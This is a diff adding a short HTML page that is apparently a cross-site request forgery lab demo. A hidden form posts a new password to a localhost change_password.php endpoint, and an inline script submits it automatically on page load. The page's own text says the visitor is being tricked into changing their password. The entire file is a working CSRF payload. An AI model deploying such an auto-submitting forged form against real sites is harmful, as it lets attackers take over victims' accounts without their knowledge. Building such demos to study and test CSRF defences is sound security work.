@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <h1>CSRF</h1>
+    <P>You are being tricked into changing your password!</P>
+    <form action="http://localhost/dashboard/csrf/csrf/change_password.php" method="post">
+        <input type="hidden" name="new_password" value="success">
+        <button type="submit">Submit</button>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
